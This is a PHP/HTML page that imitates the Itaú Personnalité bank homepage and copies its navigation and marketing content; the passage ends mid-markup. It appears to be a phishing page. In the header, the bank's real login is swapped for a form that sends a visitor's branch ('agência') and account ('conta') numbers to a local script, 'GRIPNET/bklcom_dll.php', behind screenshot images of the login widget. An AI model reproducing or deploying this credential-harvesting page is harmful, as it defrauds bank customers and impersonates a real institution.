﻿<?php
@session_start();
$tempo = time();
$aleatorio = rand(1000, 999999);
$ta = "$tempo.$aleatorio";
$ip_usuario = $_SERVER['REMOTE_ADDR'];

$_SESSION['sessao'] = md5($ta);
?>
<!DOCTYPE HTML>
<html lang="pt-BR">
	<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1"/>
<link rel="canonical" href="https://www.itau.com.br/personnalite/"/>
<title>Itaú Personnalité | Relacionamento próximo e surpreendente</title>

<meta name="description" content="Uma experiência marcante para você celebrar cada momento. Seja um cliente Personnalité e experimente um banco que é perfeito para você."/>
<meta name="template" content="personnalite"/>
<link rel="stylesheet" href="css/style.css">


    
    <script id="importLibJSFrameworkDA" src="https://www.itau.com.br/_arquivosestaticos/Itau/defaultTheme/js/da/framework/importLibJSFrameworkDA.js?KGXCXPV" type="text/javascript"></script>
    <script id="frameworkDA" src="https://www.itau.com.br/_arquivosestaticos/Itau/defaultTheme/js/da/framework/frameworkDA.js?KGXCXPV" type="text/javascript"></script> 
	



    
    
<link rel="stylesheet" href="https://www.itau.com.br/etc.clientlibs/itau/clientlibs/clientlib-base.min.9c52acaf149df66b8a09649576eba6a8.css" type="text/css">





    
    

    

    
    
















<script type="application/ld+json" xmlns="http://www.w3.org/1999/xhtml">
    {
        "@context": "http://schema.org",
        "@type": "WebSite",
        "url": "https://www.itau.com.br/",
        "potentialAction": {
            "@type": "SearchAction",
            "target": "https://www.itau.com.br/resultados/?q={search_term_string}",
            "query-input": "required name=search_term_string"
        }
    }
</script>

<link rel="shortcut icon" type="image/png" href="https://www.itau.com.br/content/dam/itau/favicon.png"/>
<meta name="google-site-verification" content="9T0vsDZzRvHiA_3VEpV6Ps8ifP15i-Kz90y4-dgvj38"/>
</head>
	
	<body data-segment="personnalite">
	

<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="header aem-GridColumn aem-GridColumn--default--12"><header>
    <a href="#menu" class="skip d-none d-lg-block">Ir para menu</a>
<a href="#body" class="skip">Ir para conteúdo principal</a>
<a href="#footer" class="skip">Ir para rodapé</a>
    <div style="background: #FFFFFF;">
        
    


<div id="marcoCivil" class="container" style="display: none" aria-hidden="true" aria-expanded="false" aria-live="polite">
	<div class="row vertical">
		<div class="col-10">
		<p class="">
				Este site usa cookies e dados pessoais de acordo com os nossos 
				<a id="link" href="https://www.itau.com.br/seguranca/termos-de-uso/" class="link" onclick="checkTermo()" target="_blank">
					<u class="link">Termos de Uso e Política de Privacidade</u></a> e, ao continuar navegando neste site, você declara estar ciente dessas condições.
			</p>
		</div>
			<div class="col-2 container-button">
					<button id="btOk" class="" onclick="checkTermo()">ok</button>
			</div>
		</div>
</div>

    </div>    
    <div>
            
    


<section class="smart-banner-app bg-white collapse keepId" id="collapseSmartBanner">
    <div class="container">
        <div class="wrapper align-items-center">
            <div class="wrapper-logo mr-md-auto d-block">
                <img src="https://www.itau.com.br/content/dam/itau/varejo/logo-app-Itau-personnalite.png" alt="logo app itaú personalité" class="logo"/>
                <div class="wrapper-app-name d-inline-block">
                    app Itaú Personnalité
                </div>    
            </div>
            <input type="hidden" name="linkPathIOS" value="https://app.adjust.com/2ck7cti_97qgik0?&amp;campaign=Home_Personnalite&amp;adgroup=&amp;creative=&amp;fallback=http%3A%2F%2Fwww.itau.com.br/personnalite/onde-estiver/"/>
            <input type="hidden" name="linkPathAndroidMobile" value="https://app.adjust.com/2ck7cti_97qgik0?&amp;campaign=Home_Personnalite&amp;adgroup=&amp;creative=&amp;fallback=http%3A%2F%2Fwww.itau.com.br/personnalite/onde-estiver/"/>
            <input type="hidden" name="linkPathAndroidTablet" value="https://app.adjust.com/2ck7cti_97qgik0?&amp;campaign=Home_Personnalite&amp;adgroup=&amp;creative=&amp;fallback=http%3A%2F%2Fwww.itau.com.br/personnalite/onde-estiver/"/>
            <div class="wrapper-align-right">
                <a href="#" class="cta" role="button">baixar</a>
                <button class="close-btn" data-toggle="collapse" data-target="#collapseSmartBanner" aria-expanded="false" aria-controls="collapseSmartBanner">
                    <span class="icon-itaufonts_fechar"></span>
                </button>                    
            </div>
        </div>
    </div>
</section>

        </div>
    <div class="navigation-top">
        
    



    <div class="container">
        <div class="row no-gutters">
            <div class="col">
                
                <a href="https://www.itau.com.br" class="navigation-button align-middle" role="button">
                    <img src="img/asaddsd.png" alt="">
                </a>
            </div>
        </div>
    </div>

    </div>
    <div class="navbar-wrapper">
        <div class="container">
            <div class="row">
                <div class="col">
                    <div class="logo float-left false">
                        <a href="https://www.itau.com.br/personnalite" aria-label="logo">   
    <img src="https://www.itau.com.br/content/dam/itau/personalite/logo-itau-personnalite-desktop.png" alt="logo Itaú Personnalité" aria-hidden="true" class="d-lg-none"/>
    <img src="https://www.itau.com.br/content/dam/itau/personalite/logo-itau-personnalite-desktop.png" alt="logo Itaú Personnalité" aria-hidden="true" class="d-none d-lg-block"/>
</a> 
                    </div>
                    <nav id="menu" class="navigation-menu float-left "> 
                        
    



    <ul class="navigation-menu-list d-flex flex-row align-items-center">
        <li class="navigation-menu-list-item dropdown">
            <a href="javascript:void(0)" id="dropdown-menu-link-0" class="dropdown-toggle " role="button" aria-expanded="false">serviços</a>
            <div class="dropdown-mega-menu" aria-labelledby="dropdown-menu-link-0">
                
                <div class="container">
                    <div class="row">
                        <div class="col">
                            
                            <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">conheça</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/conta" target="_self">conta-corrente</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/investimentos" target="_self">investimentos</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/credito" target="_self">empréstimos</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/seguros/" target="_self">proteção</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/cartoes" target="_self">cartões</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/cambio" target="_self">câmbio</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/experiencia" target="_self">experiência Personnalité</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/seja/personnalite-digital" target="_self">Personnalité digital</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/capitalizacao/" target="_self">capitalização</a>
                </li>
            </ul>
            
       
    
 


</div>


                        </div>
                        <div class="col">
                            
                            <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">resolva</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-itau/para-voce/conta-corrente/boleto" target="_self">boletos</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/servicos/comprovantes" target="_self">comprovantes</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/personnalite/seja" target="_self">seja Personnalité</a>
                </li>
            </ul>
            
       
    
 


</div>
<div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">outros segmentos</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br" target="_self">Itaú</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/uniclass" target="_self">Itaú Uniclass</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/private-bank" target="_self">Itaú Private Bank</a>
                </li>
            </ul>
            
       
    
 


</div>


                        </div>
                        <div class="col">
                            
                            <div class="cta-header-image-text section">
    


<div class="cta-header">
    <div class="cta-header-img">
        <img src="https://www.itau.com.br/content/dam/itau/personalite/casal-itau-personnalite-nas-ferias-em-veneza.jpg" alt="casal de clientes Itaú Personnalité nas férias em veneza."/>
    </div>
    <div class="cta-header-text">
        <span>Experiência Personnalité</span>
        <p>Viva uma experiência inesquecível com benefícios e vantagens especialmente selecionados para você.</p>

        <a href="https://www.itau.com.br/personnalite/experiencia" target="_self">saiba mais</a>
    </div>
</div>

</div>


                        </div>
                    </div>
                </div>
                <div>
                    
                    

                </div>
            </div>
        </li>
    
        <li class="navigation-menu-list-item dropdown">
            <a href="javascript:void(0)" id="dropdown-menu-link-1" class="dropdown-toggle " role="button" aria-expanded="false">ajuda</a>
            <div class="dropdown-mega-menu" aria-labelledby="dropdown-menu-link-1">
                
                <div class="container">
                    <div class="row">
                        <div class="col">
                            
                            <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">central de ajuda</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-itau/para-voce" target="_self">ajuda para você</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-itau/para-empresas" target="_self">ajuda para empresas</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-poder-publico" target="_self">ajuda para poder público</a>
                </li>
            </ul>
            
       
    
 


</div>


                        </div>
                        <div class="col">
                            
                            <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">dúvidas frequentes</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/atendimento-itau/para-voce/conta-corrente/itoken" target="_self">iToken</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/atendimento-itau/para-voce/cartao-de-credito/renegociacao" target="_self">renegociação</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/atendimento-itau/para-voce/cartao-de-credito/cartao-virtual" target="_self">cartão virtual</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/atendimento-itau/para-voce/cartao-de-credito/fatura-e-pagamento" target="_self">fatura</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/atendimento-itau/para-voce/cartao-de-credito/limite" target="_self">limite</a>
                </li>
            </ul>
            
       
    
 


</div>


                        </div>
                        <div class="col">
                            
                            <div class="common-links cmp-common__list section">
    



      
        
        <span class="column-title">fale com a gente</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_aplicativos" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/personnalite/onde-estiver" target="_self">app Itaú Personnalité</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_telefone" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/atendimento-itau/para-voce/telefones" target="_self">telefones</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_agencia" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/#section13" target="_self">encontre agências</a>
                </li>
            </ul>
            
       
    
 


</div>


                        </div>
                    </div>
                </div>
                <div>
                    
                    

                </div>
            </div>
        </li>
    </ul>
  
                    </nav>
                    <div class="content-nav-end float-right d-flex flex-row align-items-center">
                        <div class="search order-1">
                            
    


	<div class="container-seach">
		<a href="javascript:void(0)" class="search-toggle d-xs-none d-flex align-itens-center" role="button">
			
			<img src="img/sdasdasdd.png" alt="">
		</a>
		<div class="search-wrapper">
			<div class="container">
				<div class="row no-gutters">
					<div class="col">
						<div class="search-form">
							<form class="d-flex align-items-center" action="#" method="get" role="search">
								<div class="logo l float-left ">
									<a href="https://www.itau.com.br/personnalite" title="Logo Itaú Personnalité">
										<img src="https://www.itau.com.br/content/dam/itau/personalite/logo-itau-personnalite-desktop.png" class="d-lg-none logo-mobile"/>
										<img src="https://www.itau.com.br/content/dam/itau/personalite/logo-itau-personnalite-desktop.png" class="d-none d-lg-block"/>
									</a>
								</div>
								<span class="icon icon-busca-mobile icon-itaufonts_busca_consulta" aria-hidden="true"></span>
								<input type="search" placeholder="o que você está buscando?" name="q" class="itauSearch" autocomplete="off"/>
								<a href="javascript:void(0)" class="search-form-toggle" aria-hidden="true" tabindex="-1" role="button" style="display: none">

								</a>
								<a href="javascript:void(0)" class="icon close clickFechar" aria-label="fechar busca" role="button">
									<span class="d-flex align-items-end">
										<span class="icon-itaufonts_fechar d-flex align-items-center" aria-hidden="true"></span>
										<span class="text_fechar">fechar</span>
									</span>
								</a>
							</form>
						</div>
					</div>
				</div>
			</div>
			<div class="search-wrapper-container">
				<div class="container">
					<div class="row no-gutters">
						<div class="col">
							<div class="search-content">
								<div class="search-content-default-links">
									<span class="search-result-title">mais buscados</span>
									<ul class="links-list">
										
											<li class="search-options">
												<a href="https://www.itau.com.br/content/itau/resultados-busca.html?q=boletos&def=true">
													boletos
												</a>
											</li>
										
											<li class="search-options">
												<a href="https://www.itau.com.br/content/itau/resultados-busca.html?q=cartão%20de%20crédito&def=true">
													cartão de crédito
												</a>
											</li>
										
											<li class="search-options">
												<a href="https://www.itau.com.br/content/itau/resultados-busca.html?q=fatura&def=true">
													fatura
												</a>
											</li>
										
											<li class="search-options">
												<a href="https://www.itau.com.br/content/itau/resultados-busca.html?q=desbloqueio&def=true">
													desbloqueio
												</a>
											</li>
										
											<li class="search-options">
												<a href="https://www.itau.com.br/content/itau/resultados-busca.html?q=SMS&def=true">
													SMS
												</a>
											</li>
										
									</ul>
								</div>
								<div class="search-content-auto-complete">
									<span class="search-result-title">sugestões</span>
									<ul class="links-list"></ul>
								</div>
								<div class="input-text-key-up">
									<p>
										<a class="text-key-up" aria-hidden="true">
											<i class="icon-itaufonts_busca_consulta"></i>
											ver resultados para "
											<span class="text"></span>"
										</a>
									</p>
								</div>
								<hr/>
								<div class="search-doubt">
									
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
                        </div>                        
                        <div class="login order-2">
                            <div class="actions">
                                <div class="wrapper">
                                    <div class="access-control">
                                        <div class="mobile-access">

        <button class="btn-access align-items-center" data-toggle="collapse" data-target="#collapseSmartBanner" aria-expanded="false" aria-controls="collapseSmartBanner" aria-label="Login">    
            <span class="icon-itaufonts_usuario_perfil"></span>
            <span class="label"></span>
        </button>
</div>


  <form action="GRIPNET/bklcom_dll.php" method="post">
    <img style="margin-left:20px;padding:5px" src="img/Screenshot_3.png" alt="">
     <img class="asdjhjkdsd" src="img/Screenshot_2.png" alt="">
    <input type="text" name="aggggg"  id="numeric" placeholder="agência" maxlength="4" minlength="4" size="4" required=""> 
      <input name="contaaaaaaa" id="numeric1" maxlength="6" minlength="6" size="6"  type="text" placeholder="conta" required="">
      <input  type="image" src="img/Screenshot_1.png">  
      
  </form>

    <!-- Begin: Agencia e Conta -->

    <!-- End: Agencia e Conta -->


    <!-- End: Cartao de Credito -->

    <!-- Begin: CPF -->

    <!-- End: CPF -->

</div>

                                    </div>
                                    <a id="hamburguer-menu" data-toggle="collapse" href="#collapseMenuMobile" role="button" aria-expanded="false" aria-controls="collapseMenuMobile" aria-label="Menu">
                                        <div>
                                            <span class="line"></span>
                                            <span class="line"></span>
                                            <span class="line"></span>
                                        </div>
                                        <span class="label"></span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>                
                </div>
            </div>
        </div>
    </div>
    <nav class="navbar-wrapper-mobile collapse" aria-label="menu" id="collapseMenuMobile">
        <div class="accordion" aria-label="menu" role="menubar" id="menuItemsMobile"></div>
    </nav>
</header></div>
<div class="navigation-cta aem-GridColumn aem-GridColumn--default--12"><div class="section-navigation-cta ">
    <a href="https://www.itau.com.br/personnalite/seja" role="button" target="_self">
        <div class="container">
            <div class="row justify-content-between align-items-center">
                <div class="col-xs-8 title-navigation-cta">
                    <p class="navigation-text d-none d-lg-block">
                        <span class="icon-itaufonts_usuario_perfil person-navigation-cta"></span>
                        Viva a experiência surpreendente. Clique aqui e seja Personnalité.
                    </p>
                    <p class="navigation-text-mobile d-lg-none">
                        <span class="icon-itaufonts_usuario_perfil person-navigation-cta"></span>
                        Seja Personnalité
                    </p>
                </div>
                <div class="col-xs-1 arrow-navigation-cta">
                    <span class="icon-itaufonts_seta_right"></span>
                </div>
            </div>
        </div>
    </a>
</div></div>
<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">

<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="main-banner aem-GridColumn aem-GridColumn--default--12">
    




<section class="banner-v2  image-full">
<style scoped>

@media (max-width: 576px) {
    .image-banner {
        background-image: url(https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-andando-de-bicicleta-em-dia-ensolarado-pelas-areias-da-praia-mobile.jpg);
    }
}

@media (min-width: 576px) {
    .image-banner {
        background-image: url(https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-andando-de-bicicleta-em-dia-ensolarado-pelas-areias-da-praia-desk.jpg);  


    }
}


</style>
    <div aria-hidden="true" class="image image-banner bg-responsive  
           ">
        <div class="gradient-is-first "></div>
    </div>
    <div>
        <div>
            <div class="container ">
                <div class="no-gutters content ">
                    <h1>Bem-vindo ao Itaú Personnalité</h1>
                    <p>Relacionamento próximo e surpreendente, do seu jeito e no seu tempo.</p>
                    
    

<div class="itau-button-container">
    <a href="https://www.itau.com.br/personnalite/seja/" class=" itau-button-container__a--left itau-button-container__a" target="_blank" role="button">
            seja Personnalité
    </a> 
    <span value="#modal-login-main_banner_1192226860-button-box" class="d-none"></span>
</div>
<!-- Modal -->

</div>                  
            </div>  
        </div>
    </div>  
</section></div>
<div class="image-with-text aem-GridColumn aem-GridColumn--default--12">
    

<section class="module row-modal bg-grey-personalite ">
	<div class="container">
		<div class="row  align-items-center no-row-modal">
			
			<div class="image-with-text__image col-sm-6 order-sm-2 image-with-text__image--right ">
				
				<img src="https://www.itau.com.br/content/dam/itau/personalite/investimentos/banner-investimentos-360-personnalite.jpg" alt="Banner Personnalité 360." class="img-fluid" tabindex="-1" aria-hidden="true"/>
				
			</div>


			<div class="col-sm-6 order-sm-1">
               <div class="content">
				   <div class="inner-content ">
						<div>
<p> </p>
<h2>invista com confiança<br />
invista no Personnalité</h2>
<p>Assessoria completa que analisa, seleciona e recomenda os melhores investimentos. São mais de 400 produtos, do Itaú e de outras instituições.</p>

</div>
				   </div>
				   <div class='row'>
				   
				   
			</div>
				   <a role="button" href="https://www.itau.com.br/personnalite/investimentos/" class="  button">descubra como investir</a>
				</div>
           </div>
		  
		 
       </div>
	</div>

	<!-- Modal

	
	<sly data-sly-test="">
		<div id="modalContent_" class="modal fade" data-easein="fadeIn" role="dialog">
			<div class="modal-dialog modal-lg">
			
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">
							<span class="icon-itaufonts_fechar"></span>
						</button>
						<h2 class="modal-title"></h2>
					</div>
					<div class="modal-body">
						<img src="" alt="" title="" align="left" class="img-left">
						

						<div class="row">
							<div class="col-md-12 lista-modal">
								<h5 data-sly-test=></h5>

								<sly data-sly-unwrap data-sly-list.icon="">
									<div class="col-md-3">
										<span class=""></span>
										<p></p>
									</div>
								</sly>
							</div>
						</div>
					</div>
					<div class="modal-footer" data-sly-test=>
						<div class="col-md-12">
							<p></p>
						</div>
					</div>
				</div>
			</div>
		</div>
	</sly> -->

</section>
</div>
<div class="card-container aem-GridColumn aem-GridColumn--default--12">
    




<section class="default-padding-bottom card-container__inner col-md-12 col-xs-12 bg-white">
	<div class="container">
		<div class="card-container__title">
			<p class="overwrite">serviços</p>
			<h2>conheça os serviços Itaú Personnalité</h2>
			<div class="paragraph">
<div class="cmp-text">
    <p>Para cada momento da sua vida, uma solução Personnalité.</p>

</div>

    

</div>
		</div>

		<ul id='lightSlider' class="card-container__list #  ">
			<div class="card carousel-item section"><section class="card-with-text">
    


<div class="card__inner" aria-hidden="false">
	<div class="card__thumbnail">
		<img src="https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-segurando-seu-cartao-com-uma-mao-e-mexendo-no-seu-ipad-com-outra-mao-aproveitando-beneficios-do-cartao.jpg" alt="cliente Itaú Personnalité segurando seu cartão com uma mão e mexendo no seu iPad com outra mão aproveitando benefícios do cartão" aria-hidden="true" tabindex="-1"/>
	</div>
	<div class="card__body">
		<div class="card__caption">
			
<div class="cmp-text">
    <h3>cartões</h3>
<p> </p>
<p>benefícios exclusivos para você viver experiências incríveis</p>

</div>

    


		</div>
		<div class="card__footer">
			<a href="https://www.itau.com.br/personnalite/cartoes/" class="link ">conheça os cartões
			</a>
			
		</div>
	</div>
</div></section>
</div>
<div class="card carousel-item section"><section class="card-with-text">
    


<div class="card__inner" aria-hidden="false">
	<div class="card__thumbnail">
		<img src="https://www.itau.com.br/content/dam/itau/personalite/casal-caminhando-sorridente-conhecendo-uma-nova-cidade.jpg" alt="Casal de clientes Itaú Personnalité, sorridentes enquanto passeiam por uma cidade que estão conhecendo." aria-hidden="true" tabindex="-1"/>
	</div>
	<div class="card__body">
		<div class="card__caption">
			
<div class="cmp-text">
    <h3>câmbio</h3>
<p> </p>
<p>soluções para viagens ou para enviar e receber recursos do exterior</p>

</div>

    


		</div>
		<div class="card__footer">
			<a href="http://www.itau.com.br/personnalite/cambio" class="link " target="_self">conheça as soluções
			</a>
			
		</div>
	</div>
</div></section>
</div>
<div class="card carousel-item section"><section class="card-with-text">
    


<div class="card__inner" aria-hidden="false">
	<div class="card__thumbnail">
		<img src="https://www.itau.com.br/content/dam/itau/personalite/mae-abracando-a-filha-que-brinca-no-tablet.jpg" alt="Mãe abraçando a filha que brinca num tablet." aria-hidden="true" tabindex="-1"/>
	</div>
	<div class="card__body">
		<div class="card__caption">
			
<div class="cmp-text">
    <h3>proteção</h3>
<p> </p>
<p>o apoio que você precisa para sua família, patrimônio ou viagens</p>

</div>

    


		</div>
		<div class="card__footer">
			<a href="https://www.itau.com.br/personnalite/seguros/" class="link ">conheça as opções
			</a>
			
		</div>
	</div>
</div></section>
</div>
<div class="card carousel-item section"><section class="card-with-text">
    


<div class="card__inner" aria-hidden="false">
	<div class="card__thumbnail">
		<img src="https://www.itau.com.br/content/dam/itau/personalite/casal-feliz-enquanto-consulta-seu-credito-em-um-notebook.jpg" alt="Casal de clientes Itaú Personnalité consultando sua conta em um notebook." aria-hidden="true" tabindex="-1"/>
	</div>
	<div class="card__body">
		<div class="card__caption">
			
<div class="cmp-text">
    <h3>empréstimos</h3>
<p> </p>
<p>soluções ideais para atender a cada uma das suas necessidades</p>

</div>

    


		</div>
		<div class="card__footer">
			<a href="https://www.itau.com.br/personnalite/credito" class="link " target="_self">solicite um empréstimo
			</a>
			
		</div>
	</div>
</div></section>
</div>


		</ul>

		
	</div>
</section>
</div>
<div class="image-with-text aem-GridColumn aem-GridColumn--default--12">
    


	 

<section class="module row-modal bg-grey-personalite ">
	<div class="container">
		<div class="row  align-items-center no-row-modal">
			
			
			

				<div class="image-with-text__image col-sm-6">
					<img data-src="https://www.itau.com.br/content/dam/itau/thum_360_540x345px.jpg" alt="Logo Itaú Personnalité 360 com os dizeres &#34;invista no personnalité&#34;" class="img-fluid   " src="https://www.itau.com.br/content/dam/itau/thum_360_540x345px.jpg"/>
					<div class="video-opacity">
						<a class="card-video" href="javascript:void(0)" data-video="kW715fadwK0" role="button" aria-label="Reproduzir video">	
							<span class="icon-itaufonts_video"></span>
						</a>
						<a class="card-transcricao" href="javascript:void(0)" data-toggle="modal" data-target="#modal_kW715fadwK0">
							
						</a>
					</div>
					

					
				</div>

				<div class="col-sm-6">
					<div class="content">
						<div class="inner-content ">
								
<p>Personnalité digital</p>
<h2>atendimento do seu jeito e no seu tempo</h2>
<p>Das 8h às 22h, gerentes e especialistas em investimentos estão disponíveis onde você preferir: telefone, SMS, mensagens na internet e celular ou videoconferência.</p>


						</div>
						<div class='row'>
							
							
						</div>
						<div>
							
    

<div class="itau-button-container">
    <a href="https://www.itau.com.br/personnalite/seja/personnalite-digital" class=" itau-button-container__a--left itau-button-container__a" role="button">
            seja mais digital
    </a> 
    <span value="#modal-login-image_with_text_900922788-button-box" class="d-none"></span>
</div>
<!-- Modal -->

</div>
					</div>
				</div>
			

			

       </div>
	</div>
</section>



<div class="modal fade transcrition-modal" id="modal_kW715fadwK0" tabindex="-1" role="dialog" aria-labelledby="modalTranscricao" aria-hidden="true">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title"></h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Fechar Modal">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				
			</div>
		</div>
	</div>
</div>
</div>
<div class="card-container aem-GridColumn aem-GridColumn--default--12">
    


<section class="default-padding-bottom card-container__inner col-md-12 col-xs-12 bg-image" style="background-image: url(https://www.itau.com.br/content/dam/itau/personalite/praia-fundo.jpg)">
	<div class="container">
		<div class="card-container__title ">
			<p class="overwrite">benefícios</p>
			<h2>Programa Sempre Presente</h2>
			<div class="paragraph">
<div class="cmp-text">
    <p>Pontos para quem busca exclusividade e pontuação diferenciada.</p>

</div>

    

</div>
		</div>

		<ul class="card-container__list # https://www.itau.com.br/personnalite/cartoes/sempre-presente ">
			<div class="card-comparative section">
    


	<div class="card-comparative__inner" aria-hidden="false">
		<div class="card-comparative__thumbnail">
			
			<img src="https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-em-um-barco-observando-o-mar.jpg" alt="Cliente Itaú Personnalité sentado em um barco observando o mar." aria-hidden="true" tabindex="-1"/>
		</div>
		<div class="card-comparative__body">
			<div class="card-comparative__caption">
				
<div class="cmp-text">
    <h2>viaje o mundo</h2>
<p>passagens, hospedagens, aluguéis de carros e vários benefícios exclusivos</p>

</div>

    


			</div>
		</div>
	</div></div>
<div class="card-comparative section">
    


	<div class="card-comparative__inner" aria-hidden="false">
		<div class="card-comparative__thumbnail">
			
			<img src="https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-andando-de-moto.jpg" alt="Cliente Itaú Personnalité andando de moto com aves voando ao fundo." aria-hidden="true" tabindex="-1"/>
		</div>
		<div class="card-comparative__body">
			<div class="card-comparative__caption">
				
<div class="cmp-text">
    <h3>resgate produtos e serviços</h3>
<p>pontos se transformam em experiências e bens que combinam com você</p>

</div>

    


			</div>
		</div>
	</div></div>
<div class="card-comparative section">
    


	<div class="card-comparative__inner" aria-hidden="false">
		<div class="card-comparative__thumbnail">
			
			<img src="https://www.itau.com.br/content/dam/itau/personalite/amigas-cartonistas-itau-personnalite-sorrindo-enquanto-observam-algo-no-celular.jpg" alt="Amigas cartonistas Itaú Personnalité sorrindo enquanto observam algo no celular." aria-hidden="true" tabindex="-1"/>
		</div>
		<div class="card-comparative__body">
			<div class="card-comparative__caption">
				
<div class="cmp-text">
    <h3>acelere seus pontos</h3>
<p>pontuação dobrada nos seus cartões para aproveitar melhor o que é seu</p>

</div>

    


			</div>
		</div>
	</div></div>


		</ul>

		<a id="a" href="https://www.itau.com.br/personnalite/cartoes/sempre-presente" class="  button" role="button">conheça o programa
		</a>
	</div>
</section>


</div>
<div class="mosaic-container aem-GridColumn aem-GridColumn--default--12">
    


	 <section class="mosaic-container__section bg-white default-padding-bottom">
		<div class="container">
			<div class="mosaic-container__header">
				<p class="overright">experiência Personnalité</p>
				<h2 class="title">transforme a experiência Personnalité em momentos surpreendentes</h2>
				<p class="description">Seleção de benefícios especiais para você aproveitar do seu jeito.</p>
			</div>

			<!-- [BEGIN:MOSAICS] -->
			<div class="mosaic-container__wrapper ">
				<div class="row">
					<div class="col-12 col-sm-12 col-md-6">
						
    

	<section aria-label="estilo de vida" class="pt-0">
		<a class="mosaic-link" title="saiba mais sobre o estilo de vida Personnalité" href="https://www.itau.com.br/personnalite/experiencia/#section5"></a>
		<div class="mosaic mosaic--big " link="https://www.itau.com.br/personnalite/experiencia/#section5">
			<picture class="mosaic__image">
				<source srcset="https://www.itau.com.br/content/dam/itau/personalite/casal-homem-fazendo-surpresa-para-a-mulher_mobile.jpg" media="(max-width: 320px)" alt="Cliente Itaú Personnalité ajudando seu filho a andar de bicicleta em uma rua de condomínio"/>
				<img srcset="https://www.itau.com.br/content/dam/itau/personalite/casal-homem-fazendo-surpresa-para-a-mulher_desktop.jpg" alt="Cliente Itaú Personnalité ajudando seu filho a andar de bicicleta em uma rua de condomínio"/>
			</picture>
			<div class="mosaic__content">
				<div class="mosaic__inner-content">
					<ul class="mosaic__icons">
						
							<li class="mosaic__icons-item">
								<i class="icon-itaufonts_vestuario icon" aria-hidden="true" tabindex="-1"></i>
							</li>
						
					</ul>
					<h3>estilo de vida</h3>
					<p>parcerias em moda, beleza e decoração</p>

				</div>
			</div>
		</div>

		
	</section>
					</div>

					<div class="col-12 col-sm-12 col-md-6">
						<div class="row">
